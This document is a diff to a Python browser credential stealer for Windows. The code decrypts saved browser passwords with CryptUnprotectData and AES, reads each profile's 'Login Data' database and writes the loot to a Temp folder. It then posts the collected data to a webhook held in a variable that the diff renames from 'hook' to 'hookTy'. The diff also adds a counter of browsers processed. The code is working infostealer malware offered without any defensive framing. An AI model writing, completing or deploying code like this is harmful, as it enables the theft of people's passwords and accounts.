@@ -11,7 +11,7 @@ import os, requests, json, base64, sqlite3, shutil
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from datetime import datetime
-from config import hook
+from config import hookTy
 
 
 appdata = os.getenv('LOCALAPPDATA')
@@ -62,15 +62,19 @@ def decrypt_password(buff: bytes, master_key: bytes) -> str:
     decrypted_pass = decrypted_pass[:-16].decode()
 
     return decrypted_pass
+total_browsers = 0
 
 
 def save_results(browser_name, data_type, content):
+    global total_browsers
+
     if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
         os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
     if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
         os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
     if content is not None:
         open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
+    total_browsers += 1
 
 def get_login_data(path: str, profile: str, master_key):
     login_db = f'{path}\\{profile}\\Login Data'
@@ -255,7 +259,7 @@ def mainpass():
         }
     ]
     }
-    r = requests.post(hook, json=todo)
+    r = requests.post(hookTy, json=todo)
                 
     try:
         os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
